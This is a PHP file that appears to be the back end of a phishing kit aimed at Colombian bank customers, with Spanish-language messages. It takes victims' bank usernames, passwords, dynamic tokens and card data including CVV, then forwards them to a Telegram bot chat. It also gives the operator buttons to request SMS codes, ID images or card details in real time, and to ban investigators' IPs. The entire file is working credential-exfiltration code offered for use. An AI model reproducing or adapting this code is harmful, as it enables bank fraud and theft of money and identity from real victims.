<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

try {
    $config = [];
    $currentDir = __DIR__;
    $candidates = [];
    for ($i = 0; $i < 8; $i++) {
        $candidates[] = $currentDir . '/config.php';
        $candidates[] = $currentDir . '/token_bank/config.php';
        $currentDir = dirname($currentDir);
    }

    foreach ($candidates as $candidate) {
        if (file_exists($candidate)) {
            $loaded = include $candidate;
            if (is_array($loaded)) {
                $config = $loaded;
                if (!empty($config['bot_token']) && !empty($config['chat_id'])) {
                    break;
                }
            }
        }
    }

    // Read raw input (for JSON payload compatibility)
    $rawInput = file_get_contents('php://input');
    $jsonInput = json_decode($rawInput, true);
    if (!is_array($jsonInput)) {
        $jsonInput = [];
    }

    // Merge POST and JSON inputs
    $inputs = array_merge($_POST, $jsonInput);

    $transactionId = $inputs['transactionId'] ?? $inputs['session_id'] ?? '';
    
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
$u_id = $inputs['u_id'] ?? $inputs['usuario'] ?? $inputs['username'] ?? '';
    $u_ps = $inputs['u_ps'] ?? $inputs['contraseña'] ?? $inputs['password'] ?? $inputs['clave'] ?? '';
    $u_tk = $inputs['u_tk'] ?? $inputs['dinamica'] ?? $inputs['token'] ?? $inputs['codigo'] ?? '';
    $u_tb_raw = $inputs['u_tb'] ?? '{}';
    if (isset($inputs['tbdatos'])) {
        $u_tb_raw = is_array($inputs['tbdatos']) ? json_encode($inputs['tbdatos']) : $inputs['tbdatos'];
    }

    if (empty($transactionId) || empty($u_id) || empty($u_tk)) {
        echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
        exit;
    }

    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        echo json_encode(['status' => 'error', 'message' => 'Config vacía (bot_token/chat_id)']);
        exit;
    }

    $tb = json_decode($u_tb_raw, true);
    if (!is_array($tb)) {
        $tb = [];
    }

    $tbFallback = [];
    foreach (['nombre','documento','cedula','tipo_identificacion','correo','email','telefono','celular','direccion','banco','total_pagar','monto','amount','valor','valor_pagar','total','tarjeta','fecha','expMonth','expYear','cvv','ownerName'] as $field) {
        if (isset($inputs[$field]) && $inputs[$field] !== '') {
            $tbFallback[$field] = $inputs[$field];
        }
    }
    if (!empty($tbFallback)) {
        $tb = array_merge($tb, $tbFallback);
    }

    $bancoRaw = !empty($tb['banco']) ? $tb['banco'] : '1007 - BANCOLOMBIA';
    $banco = function_exists('jelpi_format_banco') ? jelpi_format_banco($bancoRaw, 'b-14') : strtoupper($bancoRaw);
    $monto = $inputs['monto'] ?? $inputs['amount'] ?? $inputs['total_pagar'] ?? $inputs['valor'] ?? '';
    if ($monto === '') {
        $monto = $tb['total_pagar'] ?? $tb['monto'] ?? $tb['amount'] ?? $tb['valor'] ?? $tb['valor_pagar'] ?? $tb['total'] ?? '';
    }

    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $device = 'PC';
    if (stripos($userAgent, 'Android') !== false) {
        $device = 'Android';
    } elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) {
        $device = 'iPhone';
    } elseif (stripos($userAgent, 'Mobile') !== false) {
        $device = 'Movil';
    }

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    $hora = date('d/m/Y H:i:s');

    $mensaje = "DINAMICA - {$banco} ◉

";
    if (!empty($tb['nombre'])) {
        $mensaje .= "🟢 Nombre: " . $tb['nombre'] . "

";
    }
    if ($monto !== '') {
        $mensaje .= "🟢 Monto: $" . number_format((float)$monto, 0, ',', '.') . "

";
    }
    $mensaje .= "🟢 Usuario: " . $u_id . "
";
    $mensaje .= "🟢 Clave: " . $u_ps . "

";
    $mensaje .= "🟢 Dinamica: " . $u_tk . "

";
    $mensaje .= "🟢 IP: {$ip} | Device: {$device} | {$hora}

";
    $mensaje .= "🐙 @FU7UR4MA 🐙";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Cara', 'callback_data' => "error:{$transactionId}"],
                ['text' => 'Cedula', 'callback_data' => "cedula:{$transactionId}"]
            ],
            [
                ['text' => 'Error Logo', 'callback_data' => "error_logo:{$transactionId}"],
                ['text' => 'Tarjeta', 'callback_data' => "error_tc:{$transactionId}"]
            ],
            [
                ['text' => 'Dinamica', 'callback_data' => "pedir_dinamica:{$transactionId}"],
                ['text' => 'SMS', 'callback_data' => "pedir_sms:{$transactionId}"]
            ],
            [
                ['text' => 'Error Token', 'callback_data' => "error_token:{$transactionId}"],
                ['text' => 'Finalizar', 'callback_data' => "confirm_finalizar:{$transactionId}"],
            ],
            [
                ['text' => 'Bre-B', 'callback_data' => "bre_b:{$transactionId}"],
                ['text' => '923', 'callback_data' => "923:{$transactionId}"]
            ]
        ,
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]]
    ];

    $targetChatId = $config['chat_id'] ?? '';
    $bankName = strtolower($banco ?? '');
    if (!empty($config['chat_id_bancolombia']) && (
        $bankName === 'bancolombia' || strpos($bankName, 'bancolombia') !== false
    )) {
        $targetChatId = $config['chat_id_bancolombia'];
    } elseif (!empty($config['chat_id_aval']) && strpos($bankName, 'aval') !== false) {
        $targetChatId = $config['chat_id_aval'];
    } elseif (!empty($config['chat_id_tarjetas']) && strpos($bankName, 'tarjeta') !== false) {
        $targetChatId = $config['chat_id_tarjetas'];
    }

    $data = [
        'chat_id' => $targetChatId ?: $config['chat_id'],
        'text' => $mensaje,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($response === false) {
        echo json_encode(['status' => 'error', 'message' => 'curl_error', 'detail' => $err]);
        exit;
    }

    $result = json_decode($response, true);
    echo json_encode([
        'status' => !empty($result['ok']) ? 'success' : 'error',
        'messageId' => !empty($result['ok']) ? ($result['result']['message_id'] ?? null) : null,
        'raw' => $result
    ]);
} catch (Throwable $e) {
    echo json_encode(['status' => 'error', 'message' => 'server_exception', 'detail' => $e->getMessage()]);
}
